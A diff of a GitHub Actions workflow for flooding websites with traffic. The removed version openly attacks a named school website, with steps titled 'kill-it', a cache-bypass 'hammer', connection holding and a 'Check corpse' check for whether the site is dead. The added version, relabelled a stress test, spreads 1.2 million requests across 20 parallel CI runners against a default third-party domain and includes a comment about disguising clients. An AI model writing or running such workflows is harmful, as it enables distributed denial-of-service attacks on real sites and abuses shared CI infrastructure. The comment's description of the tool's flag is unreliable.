@@ -1,39 +1,74 @@
-name: ACTUAL DESTRUCTION - NO BULLSHIT
+name: 1.2M Requests - WordPress LMS Stress Test
 
 on:
   workflow_dispatch:
     inputs:
-      duration:
-        description: 'Duration in seconds'
-        default: '60'
+      target_url:
+        description: 'Target URL (without https://)'
+        required: true
+        default: 'rifatacademy.com'
+      endpoint:
+        description: 'Path to hit (e.g., /courses/, /wp-json/wp/v2/courses)'
+        required: true
+        default: '/wp-json/wp/v2/courses'
+      concurrent_connections:
+        description: 'Connections per runner'
+        required: true
+        default: '100'
+      requests_per_runner:
+        description: 'Requests per runner (60k = 1.2M total)'
+        required: true
+        default: '60000'
 
 jobs:
-  kill-it:
+  bombard:
+    name: Runner ${{ matrix.instance }}
     runs-on: ubuntu-latest
-    
+    strategy:
+      fail-fast: false  # Let all jobs complete even if one dies
+      matrix:
+        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
-      - name: Install siege
-        run: sudo apt-get update && sudo apt-get install -y siege
-      
-      - name: PHASE 1 - Saturate connections
+      - name: Install Bombardier (Latest Release)
         run: |
-          echo "Sending 1000 concurrent connections"
-          siege -c 1000 -t ${{ github.event.inputs.duration }}s -b https://www.kkh-school.edu.bd/
-      
-      - name: PHASE 2 - Unique URL hammer (this actually works)
+          wget -q https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64
+          chmod +x bombardier-linux-amd64
+          sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
+
+      - name: Execute Load Test
+        env:
+          TARGET: ${{ github.event.inputs.target_url }}
+          PATH_ENDPOINT: ${{ github.event.inputs.endpoint }}
+          CONCURRENT: ${{ github.event.inputs.concurrent_connections }}
+          COUNT: ${{ github.event.inputs.requests_per_runner }}
         run: |
-          echo "Bypassing cache with unique URLs"
-          seq 1 5000 | xargs -P 500 -I {} curl -s "https://www.kkh-school.edu.bd/?kill={}&rand=$RANDOM" -o /dev/null &
-          sleep 10
-      
-      - name: PHASE 3 - Keep-alive hold
-        run: |
-          echo "Holding connections open"
-          for i in {1..500}; do
-            curl -s -H "Connection: keep-alive" "https://www.kkh-school.edu.bd/?hold=$i" &
-          done
-          sleep 30
-      
-      - name: Check corpse
-        run: |
-          curl --max-time 5 https://www.kkh-school.edu.bd/ || echo "SITE IS DEAD"
+          # Build full URL
+          FULL_URL="https://${TARGET}${PATH_ENDPOINT}"
+          
+          echo "=== Runner ${{ matrix.instance }} ==="
+          echo "Target: $FULL_URL"
+          echo "Requests to send: $COUNT"
+          echo "Concurrent connections: $CONCURRENT"
+          echo "Start time: $(date -u)"
+          
+          # Run bombardier with HTTP/1.1 (avoid HTTP/2 deadlock)
+          # -l flag uses random UA from list to mimic diverse clients
+          # --timeout ensures we don't hang on dead connections
+          # -p enables progress bar (visible in logs)
+          bombardier \
+            -c "$CONCURRENT" \
+            -n "$COUNT" \
+            -l \
+            --http1 \
+            --timeout 10s \
+            -p \
+            "$FULL_URL"
+          
+          echo "End time: $(date -u)"
+
+      - name: Upload Metrics (Optional)
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: runner-${{ matrix.instance }}-logs
+          path: /home/runner/work/_temp/*.log
